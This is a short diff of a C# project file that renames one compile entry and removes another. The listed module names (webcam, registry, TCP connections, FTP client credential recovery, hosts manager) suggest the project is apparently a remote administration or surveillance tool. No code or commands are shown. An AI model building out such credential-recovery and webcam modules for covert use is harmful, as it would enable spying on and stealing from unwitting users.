@@ -95,7 +95,7 @@
     <Compile Include="Core\AForge\Video\IVideoSource.cs" />
     <Compile Include="Core\AForge\Video\VideoEvents.cs" />
     <Compile Include="Core\Commands\RegistryHandler.cs" />
-    <Compile Include="Core\Commands\TCPConnectionsHandler.cs" />
+    <Compile Include="Core\Commands\TcpConnectionsHandler.cs" />
     <Compile Include="Core\Commands\WebcamHandler.cs" />
     <Compile Include="Core\Data\ClientData.cs" />
     <Compile Include="Core\Data\GeoInformation.cs" />
@@ -132,7 +132,6 @@
     <Compile Include="Core\Recovery\FtpClients\WinSCP.cs" />
     <Compile Include="Core\Registry\RegistryEditor.cs" />
     <Compile Include="Core\Registry\RegistrySeeker.cs" />
-    <Compile Include="Core\Utilities\FileSplit.cs" />
     <Compile Include="Core\Data\Host.cs" />
     <Compile Include="Core\Utilities\HostsManager.cs" />
     <Compile Include="Core\Utilities\NativeMethods.cs" />
